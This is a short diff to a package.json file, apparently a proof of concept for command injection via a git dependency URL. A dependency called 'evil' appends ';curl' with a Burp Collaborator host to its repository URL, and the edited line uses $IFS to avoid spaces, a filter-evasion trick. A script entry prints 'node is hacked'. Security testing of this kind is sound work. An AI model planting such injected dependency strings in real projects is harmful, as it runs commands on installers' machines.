@@ -12,7 +12,7 @@
     "node": "echo node is hacked"
   },
   "dependencies": {
-    "evil": "git+https://github.com/No1zy/a/;curl kxl2bgfhyd11brji8bg2sjv3gumka9.burpcollaborator.net;"
+    "evil": "git+https://github.com/No1zy/a/;curl$IFSkxl2bgfhyd11brji8bg2sjv3gumka9.burpcollaborator.net;"
   },
   "repository": {
     "type": "git",
